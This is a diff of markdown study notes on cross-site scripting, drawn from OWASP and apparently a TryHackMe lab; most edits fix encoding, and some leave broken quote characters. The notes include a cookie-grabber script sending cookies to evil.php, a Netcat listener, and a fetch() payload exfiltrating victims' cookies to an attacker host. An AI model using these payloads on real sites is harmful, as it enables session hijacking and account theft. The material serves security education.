@@ -1,6 +1,6 @@
 ﻿Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.
 
-An attacker can use XSS to send a malicious script to an unsuspecting user. The end userâ€™s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.
+An attacker can use XSS to send a malicious script to an unsuspecting user. The end user's browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.
 
 ## Description
 
@@ -9,7 +9,7 @@ Cross-Site Scripting (XSS) attacks occur when:
 1. Data enters a Web application through an untrusted source, most frequently a web request.
 2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.
 
-The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data, like cookies or other session information, to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the userâ€™s machine under the guise of the vulnerable site.
+The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data, like cookies or other session information, to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.
 
 ### Reflected and Stored XSS Attacks
 
@@ -17,7 +17,7 @@ XSS attacks can generally be categorized into two categories: reflected and stor
 
 #### Reflected XSS Attacks
 
-Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the userâ€™s browser. The browser then executes the code because it came from a â€œtrustedâ€ server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-I XSS (the attack is carried out through a single request / response cycle).
+Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user's browser. The browser then executes the code because it came from a œtrusted server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-I XSS (the attack is carried out through a single request / response cycle).
 
 #### Stored XSS Attacks
 
@@ -25,7 +25,7 @@ Stored attacks are those where the injected script is permanently stored on the 
 
 #### Blind Cross-site Scripting
 
-Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attackerâ€™s payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attackerâ€™s submitted form via the backend application, the attackerâ€™s payload will get executed. Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.
+Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker's payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker's submitted form via the backend application, the attacker's payload will get executed. Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.
 
 ### Other Types of XSS Vulnerabilities
 
@@ -33,7 +33,7 @@ In addition to Stored and Reflected XSS, another type of XSS, [DOM Based XSS](ht
 
 #### XSS Attack Consequences
 
-The consequence of an XSS attack is the same regardless of whether it is stored or reflected ([or DOM Based](https://owasp.org/www-community/attacks/DOM_Based_XSS)). The difference is in how the payload arrives at the server. Do not be fooled into thinking that a â€œread-onlyâ€ or â€œbrochurewareâ€ site is not vulnerable to serious reflected XSS attacks. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. The most severe XSS attacks involve disclosure of the userâ€™s session cookie, allowing an attacker to hijack the userâ€™s session and take over the account. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, or modifying presentation of content. An XSS vulnerability allowing an attacker to modify a press release or news item could affect a companyâ€™s stock price or lessen consumer confidence. An XSS vulnerability on a pharmaceutical site could allow an attacker to modify dosage information resulting in an overdose. For more information on these types of attacks see [Content_Spoofing](https://owasp.org/www-community/attacks/Content_Spoofing).
+The consequence of an XSS attack is the same regardless of whether it is stored or reflected ([or DOM Based](https://owasp.org/www-community/attacks/DOM_Based_XSS)). The difference is in how the payload arrives at the server. Do not be fooled into thinking that a œread-only or œbrochureware site is not vulnerable to serious reflected XSS attacks. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. The most severe XSS attacks involve disclosure of the user's session cookie, allowing an attacker to hijack the user's session and take over the account. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, or modifying presentation of content. An XSS vulnerability allowing an attacker to modify a press release or news item could affect a company's stock price or lessen consumer confidence. An XSS vulnerability on a pharmaceutical site could allow an attacker to modify dosage information resulting in an overdose. For more information on these types of attacks see [Content_Spoofing](https://owasp.org/www-community/attacks/Content_Spoofing).
 
 ### How to Determine If You Are Vulnerable
 
@@ -43,7 +43,7 @@ XSS flaws can be difficult to identify and remove from a web application. The be
 
 The primary defenses against XSS are described in the [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
 
-Also, itâ€™s crucial that you turn off HTTP TRACE support on all web servers. An attacker can steal cookie data via Javascript even when document.cookie is disabled or not supported by the client. This attack is mounted when a user posts a malicious script to a forum so when another user clicks the link, an asynchronous HTTP Trace call is triggered which collects the userâ€™s cookie information from the server, and then sends it over to another malicious server that collects the cookie information so the attacker can mount a session hijack attack. This is easily mitigated by removing support for HTTP TRACE on all web servers.
+Also, it's crucial that you turn off HTTP TRACE support on all web servers. An attacker can steal cookie data via Javascript even when document.cookie is disabled or not supported by the client. This attack is mounted when a user posts a malicious script to a forum so when another user clicks the link, an asynchronous HTTP Trace call is triggered which collects the user's cookie information from the server, and then sends it over to another malicious server that collects the cookie information so the attacker can mount a session hijack attack. This is easily mitigated by removing support for HTTP TRACE on all web servers.
 
 The [OWASP ESAPI project](https://www.owasp.org/www-project-enterprise-security-api) has produced a set of reusable security components in several languages, including validation and escaping routines to prevent parameter tampering and the injection of XSS attacks. In addition, the [OWASP WebGoat Project](https://www.owasp.org/www-project-webgoat/) training application has lessons on Cross-Site Scripting and data encoding.
 
@@ -102,7 +102,7 @@ Initially, this might not appear to be much of a vulnerability. After all, why w
 
 ### Example 2
 
-The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employeeâ€™s name.
+The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.
 
 ```html
 <%...
@@ -116,19 +116,19 @@ The following JSP code segment queries a database for an employee with a given I
 Employee Name: <%= name %>
 ```
 
-As in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the userâ€™s web browser. This type of exploit, known as Stored XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with websites that offered a â€œguestbookâ€ to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.
+As in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Stored XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with websites that offered a œguestbook to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.
 
 As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:
 
-- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attackerâ€™s content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the userâ€™s machine to the attacker or perform other nefarious activities.
-- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Stored XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attackerâ€™s perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.
+- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.
+- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Stored XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.
 - A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.
 
 ### Attack Examples
 
 **Example 1: Cookie Grabber**
 
-If the application doesnâ€™t validate the input data, the attacker can easily steal a cookie from an authenticated user. All the attacker has to do is to place the following code in any posted input(ie: message boards, private messages, user profiles):
+If the application doesn't validate the input data, the attacker can easily steal a cookie from an authenticated user. All the attacker has to do is to place the following code in any posted input(ie: message boards, private messages, user profiles):
 
 ```html
 <SCRIPT type="text/javascript">
@@ -136,11 +136,11 @@ var adr = '../evil.php?cakemonster=' + escape(document.cookie);
 </SCRIPT>
 ```
 
-The above code will pass an escaped content of the cookie (according to RFC content must be escaped before sending it via HTTP protocol with GET method) to the evil.php script in â€œcakemonsterâ€ variable. The attacker then checks the results of their evil.php script (a cookie grabber script will usually write the cookie to a file) and use it.
+The above code will pass an escaped content of the cookie (according to RFC content must be escaped before sending it via HTTP protocol with GET method) to the evil.php script in œcakemonster variable. The attacker then checks the results of their evil.php script (a cookie grabber script will usually write the cookie to a file) and use it.
 
 ### Error Page Example
 
-Letâ€™s assume that we have an error page, which is handling requests for a non existing pages, a classic 404 error page. We may use the code below as an example to inform user about what specific page is missing:
+Let's assume that we have an error page, which is handling requests for a non existing pages, a classic 404 error page. We may use the code below as an example to inform user about what specific page is missing:
 
 ```html
 <html>
@@ -153,11 +153,11 @@ print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
 </html>
 ```
 
-Letâ€™s see how it works:`http://testsite.test/file_which_not_exist` In response we get:`Not found: /file_which_not_exist`
+Let's see how it works:`http://testsite.test/file_which_not_exist` In response we get:`Not found: /file_which_not_exist`
 
 Now we will try to force the error page to include our code:`http://testsite.test/<script>alert("TEST");</script>` The result is:`Not found: / (but with JavaScript code <script>alert("TEST");</script>)`
 
-We have successfully injected the code, our XSS! What does it mean? For example, that we may use this flaw to try to steal a userâ€™s session cookie.
+We have successfully injected the code, our XSS! What does it mean? For example, that we may use this flaw to try to steal a user's session cookie.
 
 
 # TRYHACKME SECTION
@@ -559,7 +559,7 @@ An XSS polyglot is a string of text which can escape attributes, tags and bypass
 
 ## Practical Example (Blind XSS)
 
-For the last task, we will go over a Blind XSS vulnerability. Ensure you terminate the previous machine and then click on the green Start Machine button on the right to load the Acme IT Support website. Youâ€™ll need to use the AttackBox using the blue button at the top of the page. Once loaded, open the link below inside the AttackBoxâ€™s Firefox browser to view the target website. 
+For the last task, we will go over a Blind XSS vulnerability. Ensure you terminate the previous machine and then click on the green Start Machine button on the right to load the Acme IT Support website. You'll need to use the AttackBox using the blue button at the top of the page. Once loaded, open the link below inside the AttackBox's Firefox browser to view the target website. 
 
 [https://10-10-14-3.p.thmlabs.com](https://10-10-14-3.p.thmlabs.com/) 
 
@@ -585,7 +585,7 @@ Let's now expand on this payload to see if we can run JavaScript and confirm tha
 
 Now when you view the ticket, you should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.
 
-Using the AttackBox, letâ€™s set up a listening server using Netcat. If we want to listen on port 9001, we issue the command`nc -l -p 9001`. The`-l` option indicates that we want to use Netcat in listen mode, while the`-p` option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add`-n`; moreover, to discover any errors, running Netcat in verbose mode by adding the`-v` option is recommended. The final command becomes`nc -n -l -v -p 9001`, equivalent to`nc -nlvp 9001`.
+Using the AttackBox, let's set up a listening server using Netcat. If we want to listen on port 9001, we issue the command`nc -l -p 9001`. The`-l` option indicates that we want to use Netcat in listen mode, while the`-p` option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add`-n`; moreover, to discover any errors, running Netcat in verbose mode by adding the`-v` option is recommended. The final command becomes`nc -n -l -v -p 9001`, equivalent to`nc -nlvp 9001`.
 
 nc
 
@@ -594,11 +594,11 @@ user@machine$ nc -nlvp 9001
 Listening on [0.0.0.0] (family 0, port 9001)
 ```
 
-Now that weâ€™ve set up the method of receiving the exfiltrated information, letâ€™s build the payload.
+Now that we've set up the method of receiving the exfiltrated information, let's build the payload.
 
 `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
 
-Letâ€™s break down the payload:
+Let's break down the payload:
 
 ```ad-summary
 - The`</textarea>` tag closes the text area field.
@@ -606,13 +606,13 @@ Letâ€™s break down the payload:
 - The`fetch()` command makes an HTTP request.
 - `URL_OR_IP` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
 - `PORT_NUMBER` is the port number you are using to listen for connections on the AttackBox.
-- `?cookie=` is the query string containing the victimâ€™s cookies.
-- `btoa()` command base64 encodes the victimâ€™s cookies.
-- `document.cookie` accesses the victimâ€™s cookies for the Acme IT Support Website.
+- `?cookie=` is the query string containing the victim's cookies.
+- `btoa()` command base64 encodes the victim's cookies.
+- `document.cookie` accesses the victim's cookies for the Acme IT Support Website.
 - `</script>`closes the JavaScript code block.
 ```
 
-Now create another ticket using the above payload, making sure to swap out the`URL_OR_IP:PORT_NUMBER` variables with your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you will see the request come through containing the victimâ€™s cookies.
+Now create another ticket using the above payload, making sure to swap out the`URL_OR_IP:PORT_NUMBER` variables with your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you will see the request come through containing the victim's cookies.
 
 
 You can now base64 decode this information using a site like [https://www.base64decode.org/](https://www.base64decode.org/), giving you the necessary information to answer the below question.
